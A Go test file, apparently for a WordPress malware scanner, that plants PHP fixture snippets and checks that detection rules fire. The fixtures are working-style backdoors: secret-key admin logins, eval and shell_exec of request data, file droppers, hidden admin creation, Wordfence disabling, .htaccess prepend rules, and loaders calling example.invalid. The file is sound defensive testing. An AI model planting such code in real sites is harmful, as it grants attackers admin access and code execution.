		"mu-plugins/key.php":                                {"<?php\n/**\n * Plugin Name: WordPress\n * Description: Auto-update request.\n * Version: 3.3\n * Author: WordPress\n */\ndefined('ABSPATH') || exit;\ndefine('WPK_SECRET_KEY', 'devupdate');\nadd_action('init', function () {\n    if (!isset($_GET['dev']) || $_GET['dev'] !== WPK_SECRET_KEY) { return; }\n    global $wpdb;\n    $admin_id = $wpdb->get_var(\"SELECT u.ID FROM {$wpdb->users} u INNER JOIN {$wpdb->usermeta} m ON u.ID = m.user_id WHERE m.meta_key = '{$wpdb->prefix}capabilities' AND m.meta_value LIKE '%administrator%' LIMIT 1\");\n    wp_set_auth_cookie($admin_id, true);\n});\n", "fake-wordpress-plugin-header"},
		"mu-plugins/key2.php":                               {"<?php\ndefine('WPK_SECRET_KEY', 'devupdate');\nif ($_GET['dev'] !== WPK_SECRET_KEY) { exit; }\n$users = get_users(array('role' => 'administrator'));\nwp_set_auth_cookie($users[0]->ID);\n", "secret-key-admin-access"},
		"themes/x/pages/load.php":                           {"<?php echo file_get_contents($_GET['url']); ?>\n", "request-controlled-fetch"},
		"themes/x/js.php":                                   {"<?php print(\"upload::http://nothing\");", "get-nothing-marker"},
		"plugins/a/bottom-1778612994.php":                   {"<!--5MVGq9LC--><?phpif(count($_REQUEST) > 0 && isset($_REQUEST[\"\\x65le\\x6D\"])){$holder = array_filter([\"/tmp\"]);}", "escaped-superglobal-key"},
		"plugins/a/306.min.php":                             {"<?php /* E3 */ $jfF='IE'; /* 3f2X8QktRrV3i */ $mV4jko5='OK'; /* a */ $uu7L='O'; /* xVAr3I */ $aF4g=${$qrP7U.$uu7L.$mV4jko5.$jfF}; /* UurWpzFdhhe */ if(isset($aF4g['Wozj'])){eVAL($aF4g['Wozj']);}", "mixed-case-keyword"},
		"plugins/a/db.php":                                  {"<?php $f='abc';$t='cba';for($j=0;$j<strlen($e);$j++){$p=strpos($t,$e[$j]);$r.=($p===false)?$e[$j]:$f[$p];}", "substitution-cipher-decoder"},
		"plugins/a/index.php":                               {"<?php /** H3K | Tiny File Manager */ $copy_to = fm_clean_path($_POST['to']);", "tiny-file-manager"},
		"themes/t/custom-functions.php":                     {"<?php $x = explode(chr((292-248)),'8811,64,8190,63,6142,30,5248,23,9512,68,9469,43,7867,44,8253,42,359,34,7687,22,1838,24');", "chr-arith-explode"},
		"plugins/a/repair_backup.php":                       {"<?php $currency = 'g,S)MH'; $invoke='co6I_';$eye='e';$cloture = '?_c';$dashing = 'r';$imperishable= 's';$freewheel ='a;dgLOs_'; $completion ='=';$fr0st='v';$cantors = 'aN)';", "dictionary-word-obfuscation"},
		"themes/t/easypost.php":                             {"<?php $cfg = '{\"token_id\":\"ep_28e0dc8a825c43799a06a8e25c25d054\",\"token_verifier\":\"v1:ae2afe6c3d4870f8936cc8216d994168:c3959f407c\"}';", "easypost-toolkit"},
		"uploads/css41.php":                                 {"<?php $qxnc=$_COOKIE;$tuw=$qxnc[rrti];if($tuw){ $xhdpw=$tuw($qxnc[nqcl]);$phkab=$tuw($qxnc[beic]);$kjrti=$xhdpw(\"\",$phkab);$kjrti();}", "cookie-callable-backdoor"},
		"uploads/alias.php":                                 {"<?php $GLOBALS['k8371'] = 'abcdefghijklmnopqrstuvwxyz'; $GLOBALS[$GLOBALS['k8371'][53].$GLOBALS['k8371'][41].$GLOBALS['k8371'][19].$GLOBALS['k8371'][60]] = 1;", "globals-indexed-obfuscation"},
		"uploads/786131cc.php":                              {"<?php if(@is_file(\"/www/site/public/wp-content/.786131cc.php\"))@include_once \"/www/site/public/wp-content/.786131cc.php\";", "hidden-dotfile-include"},
		"uploads/4O4.php":                                   {"<?php $a = pack('H*', '706'.'173'.'736'); eval($a);", "pack-hex-concat"},
		"uploads/qwRBdotoo.php":                             {"<?php $file_content = stripslashes($_POST['file']); $filename = 'bd' . date('YmdHis') . '.php'; file_put_contents(__DIR__ . '/' . $filename, $file_content); header('Content-Type: text/plain');", "php-dropper-write"},
		"uploads/2024/01/pic.php":                           {"\xff\xd8\xff\xe0\x00\x10JFIF\x00 binary bytes <?php if (file_put_contents('x.php', $_POST['c'])) {}", "image-header-with-php"},
		"uploads/post.php":                                  {"<?php $key = hex2bin($_REQUEST[\"hld\"]);", "hex2bin-request"},
		"uploads/405.phtml":                                 {"<?php $fnct = \"fu\".\"nc\".\"tion\".\"_exi\".\"sts\"; $e = \"ev\".\"al\";", "split-string-function-name"},
		"uploads/index2.php":                                {"<?php $_________=\"\"; $_________.=\"f\";$_________.=\"_\";$________.=\"o\";$_______.=\"p\";", "underscore-variable-obfuscation"},
		"uploads/wp-incha.php":                              {"<?php /** Front to the WordPress application. */@/* * */include_once/* which does and tells */'wp-includes/x.php';", "include-wrapped-in-comments"},
		"uploads/wp-blog.php":                               {"<?php $_REQUEST = array_merge($_GET, $_POST, $_COOKIE); $f = \"create\" . \"_\" . \"function\";", "request-merge-into-request"},
		"uploads/wp-stats.php":                              {"<?php define('_JEXEC', '07b0418e1119091a9281ac5614cb9d776a85f21434408cdbbe26ca43b70618af81fecca59e592af986dae8dc8de4d1e52d');", "fake-joomla-jexec"},
		"uploads/cache.php":                                 {"<?php /*SmEvK_PaThAn Shell v3 Coded by Kashif Khan*/ $smevk = \"PD9waHAK\"; eval(\"?>\".(base64_decode($smevk)));", "webshell-names"},
		"uploads/shell.php.suspected":                       {"<?php eval(base64_decode($_POST['x']));", "eval-decode-chain"},
		"themes/x/sky.php":                                  {"<?php if (strpos($_SERVER['REQUEST_URI'], '?sky') === false) { http_response_code(404); exit; } $url = 'https://example.invalid/Nathan/alfa.txt';", "uri-key-gate-fake-404"},
		"wp-includes/class-wp-locale-helper.php":            {"<?php if(isset($_GET['_chk'])){ $d=base64_decode(isset($_POST['d'])?$_POST['d']:''); if($d){echo@shell_exec($d.' 2>&1');}exit;}", "conditional-request-base64-shell"},
		"uploads/2018/qwRBdotoo.php":                        {"<?php $custom_key = isset($_POST['ximqlz']) ? stripslashes($_POST['ximqlz']) : ''; if($custom_key === 'PtXe*JMQ%jT2HS!BSRc4a$$^'){ $filename = 'bd' . date('YmdHis') . '.php'; $file_path = __DIR__ . '/' . $filename; file_put_contents($file_path, $file_content); }", "php-dropper-write"},
		"plugins/fix/up.php":                                {"<?php if(isset($_POST[\"submit\"])) { if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], './' . basename($_FILES[\"fileToUpload\"][\"name\"]))) { echo 'ok'; } }", "bare-upload-form"},
		"uploads/aioseo/logs/mlpghswk.php":                  {"<?php $above_midpoint_count = 'uv298l1'; $is_last_exporter = 'btdjq2'; $registration_log = 'gkjsl'; $searches = 'smy2pbogk';\nfunction column_comment($ts_prefix_len){ $allowSCMPXextended = 'zhstda9x'; include($ts_prefix_len); }", "include-parameter-with-junk-vars"},
		"plugins/scanner-helper-pro/scanner-helper-pro.php": {"<?php $k='mDhr9QUcAsFA'; add_filter(d(hex2bin('1f2e3d4c5b6a')), 'a'); add_filter(d(hex2bin('a1b2c3d4e5f6')), 'b'); $u = d(hex2bin('00112233445566')); $v = d(hex2bin('ffeeddccbbaa99'));", "hex2bin-literal-obfuscation"},
		"plugins/seocore/layout.css":                        {"<?php ?>", "php-stub-asset"},
		"themes/x/cookie-check.php":                         {"<?php $tmp = \"2a7eb4d8e15f8d1c0ecb88ef28e5ab3b\"; $check = $_COOKIE[\"index\"]; if($tmp == md5($check)) { include 'x.php'; }", "cookie-md5-auth"},
		"plugins/x/stealth.php":                             {"<?php add_filter('all_plugins', function ($plugins) { if (isset($_GET['sp'])) { return $plugins; } $current = plugin_basename(__FILE__); unset($plugins[$current]); return $plugins; });", "plugin-self-hiding"},
		"themes/x/footer-ws.php":                            {"<?php add_action('wp_footer', function() { ?><script>var s = new top['W'['concat']('ebS', 'ock', 'et')]('wss://example.invalid');</script><?php });", "js-concat-obfuscated-websocket"},
		"plugins/x/globals-c.php":                           {"<?php $zed52554 = 209;$GLOBALS['u47f90929']=Array();global $u47f90929;", "globals-array-obfuscation"},
		"plugins/x/anylc.php":                               {"<?php $url = 'https://example.invalid/?v=' . urlencode($v) . '&site_url=' . urlencode(get_site_url()) . '&live=1'; $data = @file_get_contents($url); if (!$data) { return; }", "phone-home-loader"},
		"plugins/x/async.php":                               {"<?php $username_b64 = $_COOKIE['admin_user_username'] ?? ''; $password_b64 = $_COOKIE['admin_user_password'] ?? ''; $id = wp_create_user(base64_decode($username_b64), base64_decode($password_b64), 'a@b.c');", "cookie-provisioned-admin"},
		"themes/x/super.php":                                {"<?php $LnWYZK = \"\\163\".\"\\164\" .\"\\162\\137\\162\\157\" . \"\\164\" . 'x';", "octal-string-concat"},
		"plugins/x/notes.php":                               {"<?php $url = hex2bin(\"68747470733A2F2F6578616D706C652E696E76616C69642F\"); ?>", "hex-encoded-url"},
		"mu-plugins/nc-dropin.php":                          {"<?php ?><script>if(/x/.test(document.cookie)||/\\/wp-admin|\\/wp-login\\.php|wp-admin\\/|wp-login\\.php/i.test(location.pathname+location.search))return;if(window.__ncR)return;</script>", "nc-dropin-loader"},
		"themes/x/fm-index.php":                             {"<?php if (!empty($res)) { $fun='fm_'.$res_lng; echo '<pre>'.$fun($res).'</pre>'; }", "php-file-manager-fm-prefix"},
		"plugins/x/script-4aec0f13.php":                     {"<?php function i4aec0f13e8e5() { return 1; } function b9c1d2e3f4a5b6() { echo \"<script>\" . $js . \"</script>\"; }", "random-hex-function-names"},
		"plugins/x/redirect.php":                            {"<?php if (!defined('CREDIT')) { $ctx=stream_context_create(array('http'=>array('timeout' => 3))); $credit=@file_get_contents('https://example.invalid/c.txt', false, $ctx); echo $credit; }", "credit-content-injection"},
		"themes/x/filesman-index.php":                       {"<?php $default_action = 'filesman'; @define('SELF_PATH', __FILE__);", "webshell-names"},
		"plugins/a/wp-lookalike.php":                        {"<?php $server_data = $_SERVER;  $imap_get_quotaroot_cron = 'hash_pbkdf2';  /*  %s: Plugin author. */  $esc_attr_rzz = 'HTTP_7051453';", "fake-header-key-backdoor"},
		"plugins/x/FrmViewsCategory.php":                    {"<?PHp     //J+76d|sWBCM[kLO5VH1@g\" ` #<^_X)kp@Pm4(1XVmE#=ZZe/*J?aWNp1dl66lyL#\\`GTEgPy3[FW:*///0X=lq|MJ&9<Gj+[s<5J*ZNG5).\"%\\p\"mJ?[<<)gCC%j/0G#L\\N(//M'.P,kB.YlN5*k?r0bwzq(CuU D-8A-fH;8U'Zd`H4vR!6F1y?-reqUirE_oNcE  //OgP<q&YcZS)WCSo]ok~C\\d|b# DH589d!i\"sp\\WL1a$T5~\n'x.php';", "mixed-case-keyword"},
		"plugins/wp-lastweets/vendor/composer/autoload_erlistrc-8Nw6M9.php": {"<?php class code_auth { function code2leng($start, &$data, &$data_long){ $tmp = unpack('N*', $data); foreach ($tmp as $v) $data_long[$start++] = $v; return $start; } function uncode($enc){ $keyone = $_SERVER['HTTP_USER_AGENT']; if(preg_match('/WebKit\\/(.*?) \\(KHTML/is',$keyone,$src)){ $key = str_replace('.','aGcE',$src[1]); }else{ die(); } return $key; } }", "ua-keyed-decoder"},
		"uploads/loader1.php":            {"<?php include('../uploads/2024/03/banner.jpg'); ?>", "include-non-php-file"},
		"uploads/loader2.php":            {"<?php $img = file_get_contents(__DIR__ . '/logo.png'); $code = base64_decode(substr($img, strpos($img, '//'))); eval($code);", "image-payload-loader"},
		"uploads/loader3.php":            {"<?php $e = exif_read_data('photo.jpg'); eval(base64_decode($e['Comment']));", "image-payload-loader"},
		"uploads/loader4.php":            {"<?php $fp = fopen(__FILE__, 'r'); fseek($fp, __COMPILER_HALT_OFFSET__); $p = stream_get_contents($fp); eval(gzinflate(base64_decode($p))); __halt_compiler();", "self-payload-halt-compiler"},
		"uploads/loader5.php":            {"<?php include('data:text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3gnXSk7');", "data-uri-php-include"},
		".htaccess":                      {"# BEGIN WordPress\nphp_value auto_prepend_file /home/u/public_html/wp-includes/.x.php\n", "htaccess-auto-prepend"},
		"uploads/.htaccess":              {"<FilesMatch \"\\.(jpg|png)$\">\nSetHandler application/x-httpd-php\n</FilesMatch>\nAddType application/x-httpd-php .jpg\n", "htaccess-php-in-images"},
		"themes/t/.htaccess":             {"RewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} (google|bing|yahoo) [NC]\nRewriteCond %{REQUEST_URI} !admin\nRewriteRule ^(.*)$ http://example.invalid/pharma/$1 [R=301,L]\n", "htaccess-cloaked-redirect"},
		"uploads/tail-loader.php":        {"<?php $d = file_get_contents(__FILE__); $p = substr($d, strpos($d, '#@#') + 3); eval(gzinflate(base64_decode($p))); #@#", "self-reading-file-backdoor"},
		"plugins/x/kill-wf.php":          {"<?php if (is_dir(WP_PLUGIN_DIR . '/wordfence')) { deactivate_plugins('wordfence/wordfence.php'); rename(WP_PLUGIN_DIR . '/wordfence', WP_PLUGIN_DIR . '/wordfence_'); }", "wordfence-disabling"},
		"uploads/2024/login.php":         {"<?php if ($_GET['k'] === 'x') { wp_set_auth_cookie(1, true); }", "unauth-admin-login"},
		"themes/t/inc/helpers.php":       {"<?php add_action('init', function () { if (isset($_GET['tk']) && $_GET['tk'] === 'z') { $u = get_users(['role' => 'administrator', 'number' => 1]); wp_set_auth_cookie($u[0]->ID, true); } });", "theme-auth-cookie-backdoor"},
		"uploads/wp-security-helper.php": {"<?php add_action(\"\\160\\162\\x65\\137\\147\\145\\x74\\137\\x75\\163\\145\\162\\163\", 'hide');", "hidden-user-query-hook-escaped"},
	}
	for rel, c := range cases {
		write(t, dir, rel, c.content)
	}
	res := s.ScanDir(dir)
	by := map[string][]Finding{}
	for _, f := range res.Findings {
		by[f.File] = append(by[f.File], f)
	}
	for rel, c := range cases {
		found := false
		for _, f := range by[rel] {
			if f.RuleID == c.rule && SeverityRank(f.Severity) >= SeverityRank("high") {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: expected %s at high+, got %v", rel, c.rule, ids(by[rel]))
		}
	}
}

// The empty "<?php /**/ ?>" block a cleaner leaves behind is an indicator
// that the file was once injected, not malware itself: medium, never high.
func TestCleanupLeftoverStubIsMedium(t *testing.T) {
	s := shippedRules(t)
	dir := t.TempDir()
	write(t, dir, "plugins/buddypress-docs/includes/templates/docs/single/sidebar.php", "<?php /**/ ?>\n<div id=\"doc-sidebar\">\n\n</div>\n")
	write(t, dir, "plugins/x/ok.php", "<?php /** Plugin Name: Ok */ ?>\n<div></div>\n")
	res := s.ScanDir(dir)
	var got []Finding
	for _, f := range res.Findings {
		if f.RuleID == "cleanup-leftover-stub" {
			got = append(got, f)
		}
	}
	if len(got) != 1 || got[0].File != "plugins/buddypress-docs/includes/templates/docs/single/sidebar.php" || got[0].Severity != "medium" {
		t.Fatalf("expected one medium cleanup-leftover-stub finding on sidebar.php, got %+v", got)
	}
}

// TestDropInRuleFilesCompile loads every drop-in under lib/malware-signatures.d
// and asserts that all of its rules compile and carry attribution.
func TestDropInRuleFilesCompile(t *testing.T) {
	files, _ := filepath.Glob(filepath.Join("..", "lib", "malware-signatures.d", "*.json"))
	if len(files) == 0 {
		t.Skip("no drop-in rule files")
	}
	for _, f := range files {
		rs, err := LoadRuleSet(f)
		if err != nil {
			t.Fatalf("%s: %v", f, err)
		}
		s := New(rs, Options{})
		for _, e := range s.Errors {
			t.Errorf("%s: %v", filepath.Base(f), e)
		}
		for _, r := range rs.Rules {
			if r.Source == "" || r.License == "" {
				t.Errorf("%s: rule %s lacks source/license attribution", filepath.Base(f), r.ID)
				break
			}
		}
		t.Logf("%s: %d rules compiled", filepath.Base(f), s.RuleCount())
	}
}

// TestCorpus runs the shipped rules over the Wordfence ground-truth corpus
// when CAPTAINCORE_SCAN_CORPUS points at it (samples/ + index.tsv, optional
// negatives.txt of sha256 known to be Wordfence false positives). Every
// sample not listed as a negative must produce at least one finding.
func TestCorpus(t *testing.T) {
	corpus := os.Getenv("CAPTAINCORE_SCAN_CORPUS")
	if corpus == "" {
		t.Skip("CAPTAINCORE_SCAN_CORPUS not set")
	}
	negatives := map[string]bool{}
	if f, err := os.Open(filepath.Join(corpus, "negatives.txt")); err == nil {
		sc := bufio.NewScanner(f)
		for sc.Scan() {
			if h := strings.TrimSpace(strings.SplitN(sc.Text(), "#", 2)[0]); h != "" {
				negatives[h] = true
			}
		}
		f.Close()
	}
	// Family label per sample from the index, for the report.
	family := map[string]string{}
	if f, err := os.Open(filepath.Join(corpus, "index.tsv")); err == nil {
		sc := bufio.NewScanner(f)
		sc.Buffer(make([]byte, 1<<20), 1<<20)
		for sc.Scan() {
			cols := strings.Split(sc.Text(), "\t")
			if len(cols) >= 7 && family[cols[3]] == "" {
				family[cols[3]] = cols[6]
			}
		}
		f.Close()
	}
	s := shippedRules(t)
	// The corpus stores samples by hash with no extension; treat them as PHP
	// unless the recorded path says otherwise.
	entries, err := os.ReadDir(filepath.Join(corpus, "samples"))
	if err != nil {
		t.Fatal(err)
	}
	total, caught, missed := 0, 0, 0
	for _, e := range entries {
		h := e.Name()
		if negatives[h] {
			continue
		}
		total++
		path := filepath.Join(corpus, "samples", h)
		f, err := s.ScanFile(path, "plugins/corpus/"+h+".php")
		if err != nil {
			t.Errorf("%s: %v", h, err)
			continue
		}
		if len(f) > 0 {
			caught++
		} else {
			missed++
			t.Logf("MISS %s %s", h[:12], family[h])
		}
	}
	t.Logf("corpus: %d samples, %d caught, %d missed", total, caught, missed)
	if missed > 0 && os.Getenv("CAPTAINCORE_SCAN_CORPUS_REPORT_ONLY") == "" {
		t.Errorf("%d corpus samples produced no finding", missed)
	}
}

// TestCleanTree asserts zero findings over a known-clean tree (a WordPress
// core checkout, a wp.org plugin mirror) named by CAPTAINCORE_SCAN_CLEAN.
func TestCleanTree(t *testing.T) {
	clean := os.Getenv("CAPTAINCORE_SCAN_CLEAN")
	if clean == "" {
		t.Skip("CAPTAINCORE_SCAN_CLEAN not set")
	}
	s := shippedRules(t)
	res := s.ScanDir(clean)
	for _, f := range res.Findings {
		t.Errorf("false positive: %s %s:%d %s", f.RuleID, f.File, f.Line, f.Match)
	}
	t.Logf("clean tree: %d files scanned, %d findings", res.Scanned, len(res.Findings))
}
